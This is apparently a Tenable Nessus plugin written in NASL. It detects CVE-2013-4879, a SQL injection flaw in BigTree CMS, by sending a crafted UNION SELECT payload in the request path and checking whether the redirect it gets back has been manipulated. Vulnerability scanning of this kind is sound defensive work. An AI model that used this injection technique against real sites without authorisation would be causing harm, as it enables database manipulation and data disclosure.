#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(69369);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2017/02/03 20:48:27 $");

  script_cve_id("CVE-2013-4879");
  script_bugtraq_id(61699);
  script_osvdb_id(96007);
  script_xref(name:"EDB-ID", value:"27431");

  script_name(english:"BigTree CMS index.php SQL Injection");
  script_summary(english:"Tries to manipulate oldroute redirect");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP application that is affected by a
SQL injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The BigTree CMS install hosted on the remote web server fails to
sanitize user-supplied input to the application's 'site/index.php'
script before using it in a database query.

An unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information or attacks against the underlying database.

Note that the application is also likely to be affected by other
vulnerabilities such as a cross-request forgery vulnerability and
cross-site scripting vulnerabilities, although this plugin has not
checked for those."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.htbridge.com/advisory/HTB23165");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/527815/30/0/threaded");
  # https://github.com/bigtreecms/BigTree-CMS/commit/c5f27bf66a7f35bd3daeb5f693f3e2493f51b1f3
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?19778fe3");
  script_set_attribute(attribute:"solution", value:
"Either upgrade to BigTree CMS 4.0 when it is released or replace the
file 'core/inc/bigtree/cms.php' with the updated version in GitHub.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"BigTree CMS 4.0 RC2 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:bigtreecms:bigtree_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("bigtree_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/bigtree_cms");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


install = get_install_from_kb(appname:"bigtree_cms", port:port, exit_on_fail:TRUE);
dir = install["dir"];


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Try to exploit the vulnerability to manipulate the new route.
id = unixtime();
old_route = rand_str();
new_route = SCRIPT_NAME;

magic = "NESSUS_";

exploit = "%27 UNION SELECT " + id + "," + hexify(str:old_route) + "," + hexify(str:new_route) + ' -- ';

url = dir + '/index.php/' +
   str_replace(find:" ", replace:"%20", string:exploit) + "?" +
  'bigtree_htaccess_url=' + magic + old_route;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

headers = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

if (isnull(headers['$code'])) code = 0;
else code = headers['$code'];

if (isnull(headers['location'])) location = "";
else location = headers['location'];


if (
  code == 301 &&
  magic+new_route >< location
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to verify the issue by manipulating a redirection' +
      'returned by the application using the following URL :\n' +
      '\n' +
      '  ' + build_url(port:port, qs:url) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "BigTree CMS", build_url(port:port, qs:dir));
